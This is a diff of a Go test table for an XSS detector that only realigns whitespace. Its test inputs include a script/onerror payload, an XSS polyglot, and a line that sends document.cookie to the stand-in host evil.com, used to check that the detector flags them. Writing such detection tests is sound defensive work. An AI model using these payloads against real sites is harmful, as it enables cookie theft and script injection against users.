@@ -148,39 +148,39 @@ func TestXSSDetector_DetectWithDetails(t *testing.T) {
 	detector := NewXSSDetector(true)
 
 	tests := []struct {
-		name          string
-		input         string
-		wantDetected  bool
-		wantScoreMin  int
-		wantMatchMin  int
+		name         string
+		input        string
+		wantDetected bool
+		wantScoreMin int
+		wantMatchMin int
 	}{
 		{
-			name:          "Script with event handlers",
-			input:         "<script>alert(1)</script><img onerror='alert(2)' src=x>",
-			wantDetected:  true,
-			wantScoreMin:  20,
-			wantMatchMin:  2,
+			name:         "Script with event handlers",
+			input:        "<script>alert(1)</script><img onerror='alert(2)' src=x>",
+			wantDetected: true,
+			wantScoreMin: 20,
+			wantMatchMin: 2,
 		},
 		{
-			name:          "Complex polyglot",
-			input:         "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
-			wantDetected:  true,
-			wantScoreMin:  30,
-			wantMatchMin:  3,
+			name:         "Complex polyglot",
+			input:        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+			wantDetected: true,
+			wantScoreMin: 30,
+			wantMatchMin: 3,
 		},
 		{
-			name:          "DOM XSS vector",
-			input:         "document.location='http://evil.com/steal?cookie='+document.cookie",
-			wantDetected:  true,
-			wantScoreMin:  15,
-			wantMatchMin:  1,
+			name:         "DOM XSS vector",
+			input:        "document.location='http://evil.com/steal?cookie='+document.cookie",
+			wantDetected: true,
+			wantScoreMin: 15,
+			wantMatchMin: 1,
 		},
 		{
-			name:          "Clean HTML",
-			input:         "<div class='container'><p>Hello World</p></div>",
-			wantDetected:  false,
-			wantScoreMin:  0,
-			wantMatchMin:  0,
+			name:         "Clean HTML",
+			input:        "<div class='container'><p>Hello World</p></div>",
+			wantDetected: false,
+			wantScoreMin: 0,
+			wantMatchMin: 0,
 		},
 	}
 
